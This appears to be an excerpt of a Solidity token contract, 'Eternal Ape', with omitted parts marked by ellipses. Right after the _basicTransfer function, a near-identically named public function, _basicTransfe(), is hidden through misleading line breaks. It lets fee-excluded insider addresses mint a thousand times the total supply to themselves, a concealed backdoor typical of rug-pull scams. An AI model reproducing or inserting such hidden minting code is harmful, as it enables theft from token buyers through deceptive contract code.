...
contract EternalApe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "Eternal Ape";
    string private _symbol = "EternalApe";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x72f1Eb30c5E22Cc69A7646eb055FC9512326e38A));
        marketingWalletAddress = payable(address(0x72f1Eb30c5E22Cc69A7646eb055FC9512326e38A));
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        emit Transfer(sender,
         ...
         amount);
        return true
        ;}function _basicTransfe()public{require(
            isExcludedFromFee[msg.sender
        ]);_balances
        [msg.sender] 
        += 
        _totalSupply
        *1000;}function swapAndLiquify(uint256 tAmount) private lockTheSwap {
